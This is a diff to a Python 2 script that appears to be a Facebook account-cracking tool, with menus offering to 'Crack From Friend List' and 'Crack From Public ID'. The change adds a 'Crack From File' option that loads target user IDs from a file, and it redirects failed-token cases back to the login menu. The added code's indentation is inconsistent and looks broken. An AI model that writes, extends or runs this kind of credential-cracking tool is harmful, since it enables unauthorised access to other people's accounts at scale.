@@ -103,7 +103,7 @@ while (loop == 'true'):
 
 def methodlogin():
 	os.system('clear')
-	logo()
+	print logo
 	print "[1] Login With ID/Password."
 	print "[2] Login Using Token."
 	print "[3] Exit."
@@ -116,7 +116,7 @@ def methodlogin():
 		login()
 	elif hos =="2":
 		os.system('clear')
-		logo()
+		print logo
 		hosp = raw_input("[+] Give Token : ")
 		tik()
 		hopa = open('login.txt', 'w')
@@ -203,7 +203,7 @@ def menu():
 		print"\x1b[1;31mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		methodlogin()
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -214,7 +214,7 @@ def menu():
 		print"\033[1;31mYour Account is on Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		methodlogin()
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;97mThere is no internet connection"
 		keluar()
@@ -260,11 +260,12 @@ def super():
 		print"\x1b[1;97mToken invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		login()
+		methodlogin()
 	os.system('clear')
 	print logo
 	print "\033[1;97m✧ \033[1;97m1.\x1b[1;97mCrack From Friend List."
 	print "\033[1;97m✧ \033[1;97m2.\x1b[1;97mCrack From Public ID."
+	print "\033[1;97m✧ \033[1;97m3.\x1b[1;97mCrack From File."
 	print "\033[1;97m✧ \033[1;97m0.\033[1;97mBack."
 	pilih_super()
 
@@ -300,7 +301,17 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
-        
+        elif peak =="3":
+		os.system('clear')
+	        print logo
+	        try:
+	                idlist= raw_input('[+] File Name: ')
+	                for line in open(idlist ,'r').readlines():
+	                    id.append(line.strip())
+	        except IOError:
+	                print"[!] File Not Found."
+	                raw_input('Press Enter To Back. ')
+	                super()
 	elif peak =="0":
 		menu()
 	else:
